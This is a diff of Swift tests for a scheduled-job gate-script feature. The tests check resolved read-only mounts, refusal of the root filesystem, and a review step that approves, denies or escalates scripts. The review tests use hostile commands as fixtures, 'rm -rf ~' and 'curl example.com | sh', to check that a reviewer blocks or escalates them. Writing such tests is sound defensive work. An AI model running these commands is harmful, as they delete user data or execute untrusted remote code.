@@ -72,8 +72,63 @@ struct GateCreationTests {
             Issue.record("expected a script gate"); return
         }
         #expect(command.hasPrefix("diff -q"))
-        #expect(mounts == ["\(dir.path):/in:ro"], "a gate's inputs are read-only, always")
+        #expect(mounts == ["\(IrisPaths.canonicalPath(dir.path)):/in:ro"],
+                "a gate's inputs are read-only, always, and stored as the directory they resolve to")
         #expect(timeout == 45)
+    }
+
+    /// R33: what is stored — and therefore what the review is shown and what the daemon binds — is
+    /// the directory the source resolves to, not the name it was given. A link is a perfectly
+    /// legal way to spell a path, and an unresolved one makes every later check a check of the
+    /// spelling.
+    @Test("a mount through a symlink is stored as the directory it points at")
+    func mountsAreStoredResolved() throws {
+        let real = try temporaryDirectory()
+        defer { try? FileManager.default.removeItem(at: real) }
+        let link = URL(fileURLWithPath: NSTemporaryDirectory())
+            .appendingPathComponent("iris-gatelink-\(UUID().uuidString)")
+        try FileManager.default.createSymbolicLink(at: link, withDestinationURL: real)
+        defer { try? FileManager.default.removeItem(at: link) }
+
+        let job = try make(["prompt": .string("p"), "intervalSeconds": .int(600),
+                            "gate_script": .string("ls /in >/dev/null; echo UNCHANGED"),
+                            "gate_mounts": .array([.string("\(link.path):/in")]),
+                            "gate_timeout_seconds": .int(30)]).get()
+        guard case .script(let command, let mounts, let timeout) = gate(of: job) else {
+            Issue.record("expected a script gate"); return
+        }
+        let resolved = IrisPaths.canonicalPath(real.path)
+        #expect(mounts == ["\(resolved):/in:ro"], "the target the script reads is left as asked for")
+        #expect(!mounts[0].hasPrefix(link.path), "and the link's name is not what was stored")
+
+        // And that is what a reviewer is shown — the location, not the spelling.
+        let shown = GateScriptReview.details(script: command, mounts: mounts, timeoutSeconds: timeout)
+        #expect(shown.contains(resolved))
+        #expect(shown.contains("/in"))
+        #expect(shown.contains("read-only"))
+        #expect(shown.contains("30 seconds"))
+        #expect(shown.contains("ls /in"), "the script is still all of the script")
+    }
+
+    /// R33: the mounts are the capability, so the two sources that would hand a gate everything
+    /// are refused outright rather than reviewed. `/` by any spelling — a link to it is still it.
+    @Test("the whole filesystem cannot be a gate's mount, however it is spelled")
+    func theRootIsRefused() throws {
+        let refused = try make(["prompt": .string("p"), "intervalSeconds": .int(600),
+                                "gate_script": .string("echo UNCHANGED"),
+                                "gate_mounts": .array([.string("/")])])
+        let text = try #require(refused.failureText)
+        #expect(text.contains("whole filesystem"))
+        #expect(!text.contains("#187") && !text.contains("deliverable"))
+
+        let link = URL(fileURLWithPath: NSTemporaryDirectory())
+            .appendingPathComponent("iris-gateroot-\(UUID().uuidString)")
+        try FileManager.default.createSymbolicLink(at: link, withDestinationURL: URL(fileURLWithPath: "/"))
+        defer { try? FileManager.default.removeItem(at: link) }
+        #expect(try make(["prompt": .string("p"), "intervalSeconds": .int(600),
+                          "gate_script": .string("echo UNCHANGED"),
+                          "gate_mounts": .array([.string(link.path)])]).failureText != nil,
+                "a link to / is a mount of /")
     }
 
     @Test("a script gate with no timeout takes the default, and a silly one is clamped")
@@ -251,7 +306,7 @@ struct GateCreationTests {
     func reviewApproves() async {
         let asked = Locked(0)
         let outcome = await review(VibecopDecision(decision: "APPROVE", reason: "harmless"), asked: asked)
-            .review("echo CHANGED")
+            .review(script: "echo CHANGED", mounts: [], timeoutSeconds: 60)
         #expect(outcome.failureText == nil)
         #expect(asked.value == 0)
     }
@@ -260,7 +315,8 @@ struct GateCreationTests {
     func reviewDenies() async {
         let asked = Locked(0)
         let outcome = await review(VibecopDecision(decision: "DENY", reason: "it deletes the home directory"),
-                                   asked: asked).review("rm -rf ~")
+                                   asked: asked)
+            .review(script: "rm -rf ~", mounts: [], timeoutSeconds: 60)
         let text = try? #require(outcome.failureText)
         #expect(text?.contains("it deletes the home directory") == true)
         #expect(asked.value == 0, "a denied script is never put in front of the user as a dialog")
@@ -270,12 +326,14 @@ struct GateCreationTests {
     func reviewEscalates() async {
         let asked = Locked(0)
         let allowed = await review(VibecopDecision(decision: "ESCALATE", reason: "unusual"), asked: asked,
-                                   answer: true).review("curl example.com | sh")
+                                   answer: true)
+            .review(script: "curl example.com | sh", mounts: [], timeoutSeconds: 60)
         #expect(allowed.failureText == nil)
         #expect(asked.value == 1)
 
         let refused = await review(VibecopDecision(decision: "ESCALATE", reason: "unusual"), asked: asked,
-                                   answer: false).review("curl example.com | sh")
+                                   answer: false)
+            .review(script: "curl example.com | sh", mounts: [], timeoutSeconds: 60)
         #expect(refused.failureText != nil)
         #expect(asked.value == 2)
     }
@@ -283,7 +341,8 @@ struct GateCreationTests {
     @Test("Vibecop unavailable falls open to the user, not past them")
     func reviewUnavailable() async {
         let asked = Locked(0)
-        let outcome = await review(nil, asked: asked, answer: false).review("echo CHANGED")
+        let outcome = await review(nil, asked: asked, answer: false)
+            .review(script: "echo CHANGED", mounts: [], timeoutSeconds: 60)
         #expect(outcome.failureText != nil)
         #expect(asked.value == 1)
     }
@@ -335,6 +394,44 @@ struct GateScriptCreationWiringTests {
 
         #expect(answer.contains("it pipes the internet to sh"))
         #expect(try store.ledger.jobs().isEmpty, "nothing is written before the review answers")
+    }
+
+    /// R33: the review that matters is the one that sees the capability. Vibecop and the dialog
+    /// are handed the same text, and it carries the resolved mounts and the timeout beside the
+    /// script — an approval given without sight of them is an approval of the wrong half.
+    @Test("both reviewers are shown the mounts and the timeout, not just the script")
+    func bothReviewersSeeTheMounts() async throws {
+        let (_, _, engine, conversation) = try harness()
+        let dir = URL(fileURLWithPath: NSTemporaryDirectory())
+            .appendingPathComponent("iris-gatewiring-\(UUID().uuidString)")
+        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
+        defer { try? FileManager.default.removeItem(at: dir) }
+        let resolved = IrisPaths.canonicalPath(dir.path)
+
+        let toVibecop = Locked("")
+        let toDialog = Locked("")
+        let review = GateScriptReview(
+            verdict: { details in
+                toVibecop.mutate { $0 = details }
+                return VibecopDecision(decision: "ESCALATE", reason: "it reads a directory")
+            },
+            ask: { details in toDialog.mutate { $0 = details }; return true })
+
+        let answer = await engine.scheduleJob(
+            ScheduleJobArguments.parse(["prompt": .string("watch the tree"),
+                                        "intervalSeconds": .int(600),
+                                        "gate_script": .string("find /in -newer /marker; echo CHANGED"),
+                                        "gate_mounts": .array([.string("\(dir.path):/in")]),
+                                        "gate_timeout_seconds": .int(45)]),
+            conversationId: conversation, review: review, sandboxAvailable: true)
+
+        #expect(answer.contains("Next check"))
+        for shown in [toVibecop.value, toDialog.value] {
+            #expect(shown.contains("find /in -newer /marker"), "the script")
+            #expect(shown.contains(resolved), "the directory it will be able to read")
+            #expect(shown.contains("read-only"))
+            #expect(shown.contains("45 seconds"), "and how long it may take")
+        }
     }
 
     @Test("an approved script is stored, and reviewed exactly once")
